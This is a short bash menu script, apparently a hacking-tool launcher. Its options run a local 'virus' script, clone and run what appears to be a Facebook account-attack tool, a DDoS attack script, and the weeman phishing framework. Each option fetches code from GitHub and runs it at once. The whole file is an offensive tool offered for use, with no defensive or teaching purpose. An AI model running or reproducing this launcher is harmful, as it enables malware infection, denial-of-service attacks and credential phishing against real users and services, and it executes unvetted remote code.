echo " Welcom "

clear

echo "

[ 1 ] Viros

[ 2 ] Facebook

[ 3 ] DDos ATTACK

[ 4 ] weeman
"
read -p "num------>" u
if [ $u -eq 1 ]; then

cd .viruss

bash vir.sh

fi

if [ $u -eq 2 ]; then

git clone https://github.com/qw46478/facebook

cd facebook
chmod +x *
python2 oopp.py


fi
if [ $u -eq 3 ]; then

git clone https://github.com/qw46478/ROBOT-ATTACK
cd ROBOT-ATTACK
unzip ROBOT-ATTACK.zip
cd ROBOT-ATTACK
bash ROBOT-ATTACK.sh
fi
if [ $u -eq 4 ]; then

git clone https://github.com/evait-security/weeman
cd weeman
python2 weeman.py

fi

